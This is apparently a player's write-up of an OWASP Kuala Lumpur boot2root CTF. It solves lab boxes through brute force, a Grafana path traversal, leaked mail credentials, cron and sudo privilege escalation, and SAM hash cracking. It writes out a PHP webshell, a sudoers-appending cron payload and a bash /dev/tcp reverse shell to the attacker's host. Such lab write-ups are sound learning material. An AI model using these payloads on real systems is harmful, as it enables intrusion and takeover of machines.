Team Project Sekai
by helyz

This is a CTF hosted by the **OWASP Kuala Lumpur Chapter**.

Week 2 - **Boot2Root**

Date: 29 - 31 May 2026

>> 🚩 **Flag Format:** `OWASPKL{...}`

## [EASY] GGEZAF

Its 2nd Week already, you can even predict your position isnt? Well then, prove you're not tryhard. This is dockerized challenge. Use target IP below. IP: 45.32.121.222 

GLHF!

IP: 45.32.121.222
Alternative IP: 139.180.145.146

1. Did nmap recon scan ![Pasted image 20260601171509](Pasted%20image%2020260601171509.png)
2. Seems that ftp is open, so i went inside. found `info.txt` ![Pasted image 20260601171639](Pasted%20image%2020260601171639.png)

3. Chall wants us to go Privilege Escalation, tried sudo command, nothing much, so I looked for writable files owned by root, checked out `sudo.ws` ![Pasted image 20260601171920](Pasted%20image%2020260601171920.png)

4. `sudo.ws -l` showed that `cat` and `ls` can be used without sudo password ![Pasted image 20260601172045](Pasted%20image%2020260601172045.png)

5.  :P
   ![Pasted image 20260601172931](Pasted%20image%2020260601172931.png)

>> 🚩 Flag: OWASPKL{H3re's_th3_G1v3aW4y_500_p0int5_f0r_yA}

## [EASY] Spray And Pray Series

### Spray And Pray (i)

Hi abel,

I seem to have forgotten my password. I wrote it somewhere under a "rock". You think you can help me reconnect to my PC?

Thanks.

Challenge file link:
https://drive.google.com/drive/folders/18iZq6EE3OkZxeLHfVZjFLKPh4PkMtpnT?usp=sharing

If the above link does'nt work, use the following instead: https://drive.google.com/drive/folders/1HozgPMDCUzrv_1nhyStLG9IVdlKZSMHu?usp=sharing

```ctf
Flag format: OWASPKL{xxx}
```

We get these files:

![Pasted image 20260601173435](Pasted%20image%2020260601173435.png)

Since I use QEMU KVM, i converted the `.vmdk` file to `.qcow2` format with `qemu-img`.

![Pasted image 20260601175821](Pasted%20image%2020260601175821.png)

IP: 192.168.122.195

1. Nmap recon scan

![697](Pasted%20image%2020260601173156.png)

2. Found ssh open in port 22.
	Since the description of ctf mentioned `abel`, I assume that its a username, thus I ran a bruteforce attack with hydra.
	 
	>  *"I wrote it somewhere under a "rock". You think you can help me reconnect to my PC?"*
	  
	Chall desc. already pointed it out, rockyou.txt :)

2. We get the creds, `abel:angel1`. Logged in ssh, and found the flag in `local1.txt`

![Pasted image 20260601173938](Pasted%20image%2020260601173938.png)

>> 🚩 Flag: OWASPKL{a2377c9ddd1837b32c82f4774a53e7a3}

### Spray And Pray Series (ii)


Pivot to another user.

1. It seems that they want us to change users, so i checked whats available.

![Pasted image 20260601174559](Pasted%20image%2020260601174559.png)

2. There is a `.docx` file.
	
![Pasted image 20260601174635](Pasted%20image%2020260601174635.png)
	
```docx
MINIT MESYUARAT 2026                                                                                                                                                                                                                        
Garis Panduan & Dasar Kata Laluan Korporat                                                                                                                                                                                                  
Jabatan Keselamatan Maklumat & Teknologi                                                                                                                                                                                                    
Nombor Rujukan                                                                                                                                                                                                                              
JKM/2026/GP/001                                                                                                                                                                                                                             
Tarikh Mesyuarat                                                                                                                                                                                                                            
14 Januari 2026, 10:00 pagi                                                                                                                                                                                                                 
Tempat                                                                                                                                                                                                                                      
Bilik Mesyuarat Utama, Aras 12, Menara Korporat                                                                                                                                                                                             
Pengerusi                                                                                                                                                                                                                                   
En. Rahmat bin Ismail, Ketua Pegawai Keselamatan Maklumat (CISO)                                                                                                                                                                            
Klasifikasi                                                                                                                                                                                                                                 
SULIT — Dalaman Organisasi Sahaja                                                                                                                                                                                                           
1.0  Pendahuluan                                                                                                                                                                                                                            
Mesyuarat ini diadakan bagi membincangkan dan merangka garis panduan komprehensif berkenaan penggunaan kata laluan yang selamat dalam persekitaran korporat. Jabatan Keselamatan Maklumat & Teknologi (JKM) telah mengenal pasti pelbagai kelemahan yang berkaitan dengan amalan pengurusan kata laluan dalam kalangan kakitangan organisasi sepanjang tahun 2025. Laporan audit dalaman menunjukkan bahawa sebanyak 67% insiden keselamatan siber yang berlaku dalam tempoh tersebut berpunca daripada penggunaan kata laluan yang lemah atau dikongsi antara sistem yang berbeza.                                                                                                                                                 
Sehubungan dengan itu, adalah menjadi tanggungjawab setiap warga organisasi untuk mematuhi garis panduan kata laluan yang ditetapkan bagi memastikan integriti, kerahsiaan, dan ketersediaan maklumat korporat terpelihara pada setiap masa.
2.0  Kehadiran & Perwakilan                                                                                                                                                                                                                 
Ahli-ahli yang hadir dalam mesyuarat ini adalah seperti berikut:                                                                                                                                                                            
En. Rahmat bin Ismail — Ketua Pegawai Keselamatan Maklumat (CISO)                                                                                                                                                                           
Pn. Suria binti Kamaruddin — Pengurus Keselamatan Rangkaian                                                                                                                                                                                 
En. Tesfayez Worku — Pembangun Sistem Senior
Cik Niki Azman — Pegawai Keselamatan Maklumat
En. Don Oliver — Penganalisis Risiko IT
Pn. Malone Chong — Ketua Unit Infrastruktur
En. Abel Salleh — Juruaudit Dalaman IT
En. Ubuntu Krishnan — Pentadbir Sistem
3.0  Kepentingan Kata Laluan Yang Kukuh
Kata laluan merupakan barisan pertahanan pertama dalam melindungi aset maklumat organisasi. Kata laluan yang lemah atau mudah diteka memberikan peluang kepada pihak yang tidak bertanggungjawab untuk mendapatkan akses tanpa kebenaran kepada sistem dan data sensitif syarikat. Dalam era ancaman siber yang semakin canggih, penggunaan kata laluan yang kukuh bukan lagi pilihan — ia adalah keperluan mandatori.
3.1  Ancaman Semasa
Berdasarkan laporan keselamatan siber global 2025, ancaman berikut telah dikenal pasti sebagai paling berbahaya berkaitan pengurusan kata laluan:
Serangan brute force — cubaan sistematik semua kombinasi kata laluan yang mungkin
Serangan kamus (dictionary attacks) — penggunaan senarai kata laluan umum yang telah bocor
Credential stuffing — penggunaan semula kombinasi nama pengguna dan kata laluan yang telah dicuri
Phishing — penipuan untuk mendapatkan kata laluan melalui laman web atau e-mel palsu
Serangan man-in-the-middle — pemintasan komunikasi untuk mencuri kelayakan pengesahan
3.2  Impak Keselamatan
Kegagalan dalam mengamalkan kata laluan yang kukuh boleh mengakibatkan impak yang sangat serius kepada organisasi, termasuk kehilangan data pelanggan, kerosakan reputasi korporat, denda pematuhan regulasi, dan kerugian kewangan yang signifikan. Kajian oleh IBM Security mendapati purata kos pelanggaran data pada tahun 2025 mencecah USD 4.88 juta — satu angka yang tidak boleh dipandang ringan.
4.0  Garis Panduan Kata Laluan Korporat
Semua kakitangan diwajibkan mematuhi garis panduan berikut dengan segera berkuat kuasa dari tarikh mesyuarat ini:
4.1  Keperluan Minimum Kata Laluan
Panjang minimum lapan (8) aksara; disyorkan empat belas (14) aksara atau lebih.
Mengandungi sekurang-kurangnya satu huruf besar (A-Z).
Mengandungi sekurang-kurangnya satu huruf kecil (a-z).
Mengandungi sekurang-kurangnya satu angka (0-9).
Mengandungi sekurang-kurangnya satu aksara khas (!, @, #, $, %, ^, &, *).
Tidak mengandungi nama pengguna, nama sebenar, atau nama syarikat.
Tidak menggunakan perkataan yang terdapat dalam kamus bahasa mana-mana.
4.2  Polisi Pengurusan Kata Laluan
Kata laluan mesti ditukar setiap sembilan puluh (90) hari.
Enam (6) kata laluan terdahulu tidak boleh digunakan semula.
Kata laluan tidak boleh dikongsi dengan mana-mana individu, termasuk rakan sekerja.
Kata laluan tidak boleh disimpan dalam bentuk teks biasa, buku nota, atau helaian kerja tidak terenkripsi.
Penggunaan pengurus kata laluan (password manager) yang diluluskan oleh JKM adalah amat digalakkan.
Pengesahan dua faktor (2FA) adalah mandatori untuk semua sistem kritikal.
5.0  Klasifikasi Kata Laluan — Contoh & Penilaian
Dalam sesi mesyuarat ini, pelbagai contoh kata laluan telah dibentangkan oleh Cik Niki Azman selaku Pegawai Keselamatan Maklumat bagi tujuan demonstrasi dan pendidikan kepada seluruh peserta mesyuarat. Contoh-contoh ini digunakan untuk menggambarkan perbezaan antara kata laluan yang lemah, sederhana, dan kukuh. Peserta diminta untuk tidak menggunakan contoh-contoh ini dalam sistem sebenar.
Berikut adalah contoh kata laluan yang dikemukakan dalam sesi demonstrasi, berserta penilaian keselamatan masing-masing:
#
Contoh Kata Laluan
Tahap
Ulasan Keselamatan
i.
123456
LEMAH
Kata laluan paling lazim digunakan di seluruh dunia. Boleh diceroboh dalam masa kurang daripada satu saat. Penggunaan ini adalah DILARANG KERAS.
ii.
Password123
LEMAH
Walaupun mengandungi huruf besar dan angka, ia menggunakan perkataan kamus yang mudah diteka. Serangan kamus mudah memecahkannya dalam masa beberapa minit.
iii.
niki_ily3000@2019
SEDERHANA
Lebih panjang dan mengandungi aksara khas serta angka. Namun, mengandungi maklumat peribadi (nama, tahun) yang boleh diteka melalui kejuruteraan sosial.
iv.
abel_0411@weekndbuk1tj4lil
KUKUH
Panjang, mengandungi kombinasi huruf, angka, dan aksara khas. Penggunaan karakter yang tidak berkaitan menjadikannya sukar diteka. Menghampiri standard yang ditetapkan.
v.
C5c56879cbb62d314bf76582c78bcfb7
KOMPLEKS
Kelihatan seperti cincangan MD5. Walaupun sangat selamat dari sudut entropi, ia terlalu sukar untuk diingati oleh manusia dan boleh menyebabkan pengguna menyimpannya secara tidak selamat.
Kesimpulan daripada demonstrasi di atas: kata laluan yang ideal adalah panjang, rawak, tidak mengandungi maklumat peribadi yang mudah diteka, dan masih boleh diingati atau disimpan dengan selamat menggunakan pengurus kata laluan yang diluluskan.
6.0  Penggunaan Semula Kata Laluan Merentas Sistem
Salah satu amalan paling berbahaya yang dikenal pasti oleh JKM ialah penggunaan semula kata laluan yang sama merentas pelbagai sistem dan perkhidmatan. Fenomena ini dikenali sebagai credential reuse dan menjadi punca utama serangan credential stuffing yang semakin berleluasa.
Kakitangan DILARANG menggunakan kata laluan yang sama untuk:
Sistem dalaman korporat (ERP, CRM, HR)
E-mel korporat
Rangkaian VPN dan akses jauh
Akaun peribadi (media sosial, e-mel peribadi, perbankan dalam talian)
Sistem pihak ketiga yang diakses atas nama syarikat
7.0  Prosedur Kecemasan & Pelaporan
Sekiranya kakitangan mengesyaki kata laluan mereka telah dicuri, didedahkan, atau dikompromi, tindakan berikut perlu diambil dengan segera:
Tukar kata laluan dengan serta-merta melalui portal pengurusan akaun dalaman.
Laporkan insiden kepada JKM melalui e-mel: security@korporat.com.my atau talian kecemasan: +603-XXXX-XXXX.
Jangan cuba menyiasat sendiri atau memberitahu pihak lain yang tidak berkaitan.
Bekerjasama sepenuhnya dengan pasukan JKM dalam proses siasatan.
Semak semua aktiviti akaun dalam tempoh 30 hari lepas untuk mengenal pasti sebarang akses yang mencurigakan.
```

3. There are 5 given passes, from i to v. So I used them all.

For user `niki`, I used `abel_0411@weekndbuk1tj4lil` as the password, it worked. Flag found in `local2.txt` :>

![598](Pasted%20image%2020260601175159.png)

>> 🚩 Flag: OWASPKL{d73aa3d24c1fb6ce993a38efe5505369}

### Spray And Pray Series (iii)

Get root.

1. There is a .sh file inside `/Downloads`.

![Pasted image 20260601175550](Pasted%20image%2020260601175550.png)

It seems that we can create a new sudo user with this.

2. Launched sudo in a clean env to use the script.

![Pasted image 20260601175613](Pasted%20image%2020260601175613.png)

3. Root access achieved, Flag found :3

![Pasted image 20260601180320](Pasted%20image%2020260601180320.png)

>> 🚩 Flag: OWASPKL{05400e69198b6036bc1c05302435648e}

## [Medium] Routine Series

### Routine (i)

This box is vulnerable, and uses a mysql plugin.

Challenge file link:
https://drive.google.com/drive/folders/12qTEcsKci_xycM1tJJcPqkOb0wsOOxRg?usp=drive_link

If the above link doesn't work, use the following link: https://drive.google.com/drive/folders/1_oXQtqq4mkJXBgPaTUOfXNFOWWkl5kdf?usp=sharing

```ctf
Flag format: OWASPKL{xxx}
```

QEMU KVM Setup Done.

![Pasted image 20260601180536](Pasted%20image%2020260601180536.png)

1. Nmap reconnaissance scan

![Pasted image 20260601180630](Pasted%20image%2020260601180630.png)

Checked port `3000`. Grafana Login webpage.

![Pasted image 20260601215449](Pasted%20image%2020260601215449.png)

2. Checking grafana ver. & testing to see if its **[CVE-2021-43798](https://nvd.nist.gov/vuln/detail/cve-2021-43798)** compatible (path traversal). Grafana version must be 8.0.0 - 8.3.0 for this to work. First command shows that it's in version 8.3.0

![Pasted image 20260601181519](Pasted%20image%2020260601181519.png)

2. Yoinked the `grafana.db` file with curl.

![Pasted image 20260601181800](Pasted%20image%2020260601181800.png)

3. Checked the sqlite3 DB schema. Saw credentials...

![Pasted image 20260601181817](Pasted%20image%2020260601181817.png)

4. Found gold :3

![Pasted image 20260601181853](Pasted%20image%2020260601181853.png)

5. I used all credentials on grafana, nothing... Until then `tellytubby:V4lor4nt-Anti-cHEAT` got me in ssh :O 

![Pasted image 20260601181930](Pasted%20image%2020260601181930.png)

Got the flag!

>> 🚩 Flag: OWASPKL{496d5373e7501c9aab3b2658bbad4c02}

### Routine Series (ii)

Get root.

1. Found something odd, `userbackup.py` spotted in `~/Downloads`.

![Pasted image 20260601182239](Pasted%20image%2020260601182239.png)

2. Checking file permissions.

![Pasted image 20260601182303](Pasted%20image%2020260601182303.png)

3. Because `userbackup.py` exists, I checked for any cronjobs that are running
![Pasted image 20260601182409](Pasted%20image%2020260601182409.png)

4. Seems that it runs every minute, so we create a payload within `userbackup.py` that gives SUID copy of sh & adds myself to sudoers

```bash 
   echo 'import os; os.system("echo \"tellytubby ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")' >> ~/Downloads/userbackup.py
```

5. Wait for the cron job then *voila*, Flag spotted Owo

![Pasted image 20260601182653](Pasted%20image%2020260601182653.png)

>> 🚩 Flag: OWASPKL{b0f8c51049b9db31552bda1bd751940a}

## [Hard] Chains Of Attacks Series

### Chains Of Attacks (i)

This challenge isn't really hard. But its effort consuming. 

Challenge file link: [https://drive.google.com/drive/folders/1qu0S5jvI968Lo8YKn8SzL1WOoo2MXS77?usp=sharing](https://drive.google.com/drive/folders/1qu0S5jvI968Lo8YKn8SzL1WOoo2MXS77?usp=sharing "https://drive.google.com/drive/folders/1qu0S5jvI968Lo8YKn8SzL1WOoo2MXS77?usp=sharing") 

If the above link does not work, please use the following instead: [https://drive.google.com/drive/folders/1kCYQYbVf4shqJwZzYcgkRfiexKZ3KHaN?usp=sharing](https://drive.google.com/drive/folders/1kCYQYbVf4shqJwZzYcgkRfiexKZ3KHaN?usp=sharing "https://drive.google.com/drive/folders/1kCYQYbVf4shqJwZzYcgkRfiexKZ3KHaN?usp=sharing")

```ctf
Flag format: OWASPKL{xxx}
```

QEMU KVM Setup Done.

![Pasted image 20260601190102](Pasted%20image%2020260601190102.png)

1. Nmap recon scan

![Pasted image 20260601202631](Pasted%20image%2020260601202631.png)

Saw port `8080`,`9090` open. Checked them both.

Webmin at port `9090`
![Pasted image 20260601214828](Pasted%20image%2020260601214828.png)

Classic apache page on port `8080`

![Pasted image 20260601215146](Pasted%20image%2020260601215146.png)

2. Based from the messages in the VM, I created a wordlist. Then did a hydra bruteforce on user profapokalips with imap, somehow managed to get the password
    `profapokalips:admin`

![Pasted image 20260601203104](Pasted%20image%2020260601203104.png)

3. Netcatting into port 143 with the cracked creds given nya~, then I tried fetching those leaked emails inside profapokalips' account coz it said;
   > *"macam mana email kita bole leaked do?"* -Kdjebat

![Pasted image 20260601203523](Pasted%20image%2020260601203523.png)

Email output from profapokalips' inbox was:
```fish
* 1 FETCH (BODY[] {328}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Pasal deployment baru
Date: Mon, 19 May 2026 09:14:22 +0800

Yo bro,

Aku nak start setup CMS baru untuk project ni.
Nama dia RiteCMS. Korang dah pernah guna tak?

Aku tengah test kat local dulu. Nanti kalau okay
aku deploy kat server.

- Kdjebat
)
* 2 FETCH (BODY[] {326}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 10:45:11 +0800

Ha ah ringan gila. PHP je. Tak payah banyak
dependencies.

Plan nak deploy minggu ni jugak. Kat server
chain tu. Port 8080.

Ko nanti kena tolong test dari luar sekali.

- Kdjebat
)
* 3 FETCH (BODY[] {296}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 11:58:02 +0800

Ha ah default memang admin admin.

Tapi jangan risau aku dah tukar. Nanti
aku bagi password baru.

Deployment petang ni kot. Aku update ko.

- Kdjebat
)
* 4 FETCH (BODY[] {260}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Update deployment
Date: Mon, 19 May 2026 15:22:37 +0800

Bro,

Done dah deploy. Running smooth.

http://chain:8080/ritecms

Cuba ko hit dari browser. Tengok dapat tak.

- Kdjebat
)
* 5 FETCH (BODY[] {348}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:03:58 +0800

Ha betul. Ni ha.

username: admin

password aku dah setup. japgi aku send.
YWN0dWFsbHkxMjNA==

tapi pandai ah kau decode. pakai cyberchef je.

kalau takleh masuk, bgtau. aku create user baru.

- Kdjebat
)
* 6 FETCH (BODY[] {319}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:40:05 +0800

Ha tu la. Senang sikit manage content.

Tapi jangan main-main upload benda pelik
kat file manager tu. Server production ni.

Ko test functionality yang basic je dulu.

- Kdjebat
)
* 7 FETCH (BODY[] {339}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Tue, 20 May 2026 10:02:17 +0800

Okay good.

Lepas ni aku plan nak integrate dengan
database. Ada sikit lagi kena configure.

For now deployment dah stable. Aku inform
team lain sekali.

Thanks sebab tolong test bro.

- Kdjebat
)
* 8 FETCH (BODY[] {259}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Pasal username
Date: Tue, 20 May 2026 14:33:09 +0800

Oh lupa nak bagitau.

Aku dah tukar username admin tu.
Pakai nama aku sekarang.

Password sama je. Tak tukar pun.

- Kdjebat
)
A3 OK Fetch completed (0.001 + 0.000 secs).
```

4. From the conversation, they mentioned about RiteCMS on the 4th, `http://chain:8080/ritecms`. 

```fish
* 4 FETCH (BODY[] {260}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Update deployment
Date: Mon, 19 May 2026 15:22:37 +0800

Bro,

Done dah deploy. Running smooth.

http://chain:8080/ritecms

Cuba ko hit dari browser. Tengok dapat tak.

- Kdjebat
```

So I immediately checked it out.

![Pasted image 20260601203722](Pasted%20image%2020260601203722.png)

5. Since its true, I went ahead and checked the RiteCMS backend login `/admin.php`

>`http://192.168.122.86:8080/ritecms/admin.php`

![Pasted image 20260601203902](Pasted%20image%2020260601203902.png)

6. We get a login page, I tried `admin:admin` and it didn't work bcuz from the emails, they did mention that they've changed it on the 5th mail. 

```fish
* 5 FETCH (BODY[] {348}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:03:58 +0800

Ha betul. Ni ha.

username: admin

password aku dah setup. japgi aku send.
YWN0dWFsbHkxMjNA==

tapi pandai ah kau decode. pakai cyberchef je.

kalau takleh masuk, bgtau. aku create user baru.

- Kdjebat
)
```

The password, `YWN0dWFsbHkxMjNA==` is decrypted into base64. `=` gave away the hint. I used base64 web decoder to find out the actual password, `actually123@`.

![Pasted image 20260601204726](Pasted%20image%2020260601204726.png)

**../NOTE: I've already set the `chain` host as the VM's IP in `/etc/hosts`, so you will see me use chain alot now instead of the actual IP/**

6. Since the pass didn't work for the RiteCMS login, i went ahead and netcatted into kdjebat manually, with the creds `kdjebat:admin`. Then I went ahead and lurked on kdjebat's inbox emails.

![Pasted image 20260601204942](Pasted%20image%2020260601204942.png)

Email output from kdjebat's inbox:

```fish
* 1 FETCH (BODY[] {293}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 10:02:55 +0800

Eh belum pernah guna lagi la.

Tapi aku pernah tengok documentation dia.
Nampak okay je. Ringan kan?

Bila ko plan nak deploy? Server mana?

- Prof
)
* 2 FETCH (BODY[] {260}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 11:30:44 +0800

Ok boleh. Aku free dari Rabu ni.

Eh tapi CMS tu ada admin panel kan?
Default creds dia apa? Admin admin ke?

- Prof
)
* 3 FETCH (BODY[] {244}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 15:45:19 +0800

Dapat. Nampak landing page dia.

Tapi aku tak boleh masuk admin panel lagi.
Belum ada creds kan?

- Prof
)
* 4 FETCH (BODY[] {285}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:21:44 +0800

Haha okay okay aku faham hint tu.

Dah masuk dah. Nampak dashboard.

Eh banyak jugak feature dia. File manager
ada sekali eh. Best gak.

- Prof
)
* 5 FETCH (BODY[] {311}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Update deployment
Date: Tue, 20 May 2026 09:15:33 +0800

Relax bro aku tau la.

Aku dah test create page, upload gambar,
semua okay je.

Performance pun laju. Good choice la CMS ni.

Ada lagi ke benda nak kena setup?

- Prof
)
* 6 FETCH (BODY[] {256}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subjet: RE: Update deployment
Date: Fri, 22 May 2026 20:00:00 +0800

Salam bro,
aku tukar password. Password lama tak betul. New password (sila decrypt):

YWN0dWFsbHlpZGsxMjNA==

- kdjebat)
B4 OK Fetch completed (0.001 + 0.000 secs).
```

7. The mail leaks inside kdjebat's account mentioned that the last password wasn't right as said from the last one.

```fish
* 6 FETCH (BODY[] {256}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subjet: RE: Update deployment
Date: Fri, 22 May 2026 20:00:00 +0800

Salam bro,
aku tukar password. Password lama tak betul. New password (sila decrypt):

YWN0dWFsbHlpZGsxMjNA==

- kdjebat)
B4 OK Fetch completed (0.001 + 0.000 secs).
```

New one is `YWN0dWFsbHlpZGsxMjNA==`. Also in base64 so I decrypted it accordingly. Retreived the latest password, `actuallyidk123@`.

![249](Pasted%20image%2020260601210403.png)

8. Boom, I'm now in RiteCMS admin access. (Hell yeah!!)

![Pasted image 20260601210608](Pasted%20image%2020260601210608.png)

9. From the Footer, I navigated through the admin panel.

![Pasted image 20260601210713](Pasted%20image%2020260601210713.png)

10. Went to File Manager, and found a potential way to do the Authentication RCE exploit by uploading a webshell here

![Pasted image 20260601210816](Pasted%20image%2020260601210816.png)

11. Created a simple `shell.php` script and uploaded into `/ritecms/files/shell.php`

```php
<?php system($_GET['cmd']); ?>
```

![Pasted image 20260601211619](Pasted%20image%2020260601211619.png)

12. Since the location is under `/ritecms/files/shell.php`, we just run the `cmd` via the url: `http://chain:8080/ritecms/files/shell.php?cmd=whoami`

woa! www-data :D
![Pasted image 20260601211849](Pasted%20image%2020260601211849.png)

I'm now in the post-privilege escalation phase (post-privesc).

13. Getting proper reverse shell as the current one is limited, it is triggered by running `http://chain:8080/ritecms/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.122.1/4444+0>%261'` on browser.

14. Netcatted into www-data *nya~*

![Pasted image 20260601212222](Pasted%20image%2020260601212222.png)

15. Stabilizing the shell for it to be fully interactive (allows sudo and su cmds), then I passed keystrokes directly to the remote shell so i could use tab and arrow keys in it.

![Pasted image 20260601213003](Pasted%20image%2020260601213003.png)

16. Snoopin' around to find the flag in `/var/www/local.txt`:3

![Pasted image 20260601213045](Pasted%20image%2020260601213045.png)

>> 🚩 Flag: OWASPKL{47f1adc2c50c9a61292b05eb444c07eb}

### Chain Of Attacks Series (ii)

Get root.

1. Checking sudo privileges

![Pasted image 20260601213149](Pasted%20image%2020260601213149.png)

2. Testing sudo cmds

![Pasted image 20260601213207](Pasted%20image%2020260601213207.png)

3. Checking out RiteCMS /dirs and found `users.db`, somethings there...

![Pasted image 20260601213724](Pasted%20image%2020260601213724.png)

now i can read :>

![643](Pasted%20image%2020260601213733.png)

4. Seems that user `aimantino` has admin privileges, so I used that credentials on Webmin, *i'm in.*

![Pasted image 20260601220603](Pasted%20image%2020260601220603.png)

5. Navigated to Tools > Terminal and went ahead for root :3

![Pasted image 20260601220658](Pasted%20image%2020260601220658.png)

>> 🚩 Flag: OWASPKL{68e8511198425c0cbbb3f0d182314afd}

## [Very Hard] The Art Of Evasion & Persistence

### The Art Of Evasion & Persistence (i)

This box has an active Microsoft Windows Defender, that scans and quarantine any exploits. 

It will do it's best to fight you. 

Goodluck. 

Note: This challenge has no official writeup. It has been tested and solved by various methods. Solution is entirely based on creativity (within the bounds of the rules). 

Challenge file link: 
[gdrive1](https://drive.google.com/drive/folders/1suP1bl1U8AAqR-GW67mGgNXYFhq1ZBPV?usp=sharing "https://drive.google.com/drive/folders/1suP1bl1U8AAqR-GW67mGgNXYFhq1ZBPV?usp=sharing") 

If the above link does not work, please either one of the following: 
[gdrive2](https://drive.google.com/drive/folders/1ZnCwFgnWnqZ2WAJMoI-RCKq9yL_LfeB7?usp=sharing "https://drive.google.com/drive/folders/1ZnCwFgnWnqZ2WAJMoI-RCKq9yL_LfeB7?usp=sharing") 
[gdrive3](https://drive.google.com/drive/folders/18k4QJA1XYaZzhj-jCvp4rtBPe6U2_GlY?usp=sharing "https://drive.google.com/drive/folders/18k4QJA1XYaZzhj-jCvp4rtBPe6U2_GlY?usp=sharing")

```ctf
Flag format: OWASPKL{xxx}
```

QEMU KVM Setup;
- UEFI (OVMF) with Q35 chipset ![Pasted image 20260601221115](Pasted%20image%2020260601221115.png)
- VirtIO video model with 3D accel ![Pasted image 20260601221134](Pasted%20image%2020260601221134.png)
- 2048 mem + 2 CPU cores
- NAT network bridge

IP is 192.168.122.126 (viewed from QEMU KVM)

Seems dat we gonna find a way to get in on *Windose* now >:D

![Pasted image 20260601221202](Pasted%20image%2020260601221202.png)

1. NMAP Scan 

![Pasted image 20260601221316](Pasted%20image%2020260601221316.png)

`http://192.168.122.126` shows IIS page. Interesting, this reminds me of the *sacred Windows 8 poopOS.*

![Pasted image 20260601221552](Pasted%20image%2020260601221552.png)

Port `8080` shows XAMPP page.

![643](Pasted%20image%2020260601221934.png)

2. Used ftp on host, found SAM and SYSTEM registry.![Pasted image 20260601222028](Pasted%20image%2020260601222028.png)

3. Yoinked SAM and SYSTEM with impacket-secretsdump.py , found local NLTM hashes with impacket ![Pasted image 20260601222627](Pasted%20image%2020260601222627.png)

4. created NLTM_hashes.txt file, then used hashcat to crack it ![Pasted image 20260601222646](Pasted%20image%2020260601222646.png)

5. We get `97d15e7e19988b89622647e0c2a5f2a1:webhead2290`, which means that the
   creds are `webadmin:webhead2290` based from the NLTM_hashes.txt file.
   Now I stared checking what the user can access on the net with SMB. ![Pasted image 20260601222745](Pasted%20image%2020260601222745.png)

6. Seems that its a standard user, we gotta go deeper ![Pasted image 20260601222904](Pasted%20image%2020260601222904.png)
   
7. Found backup key from hashcat, using rockyou.txt and best66.rule. ![Pasted image 20260601223047](Pasted%20image%2020260601223047.png)

8. Snooped into webadmin via. SMB and somehow found the flag sitting there lol![Pasted image 20260601223110](Pasted%20image%2020260601223110.png)

>> 🚩 Flag: OWASPKL{b955142d1496bc8d6f0d5b16f014666}

## Extra Pics

![Pasted image 20260604033112](Pasted%20image%2020260604033112.png)

I didn't manage to solve the last one in time, but I will update this writeup in the future when I solved it on my own :)

![Pasted image 20260604033136](Pasted%20image%2020260604033136.png)

There was around 178 teams in this CTF, nevertheless I had alot of fun. I learned alot along the way, and I will improve myself to be even better than before.

I stayed up all night until the brink of dawn just to solve these questions, sometimes I forgot to eat till' my tummy rumbles. 

I sleep when people are awake. I wake up when people are asleep.

I can't lie, that solving these questions feels even better than getting an A+, or even winning a sweaty ass competitive match.

It's just the beginning.

This is exhilarating.
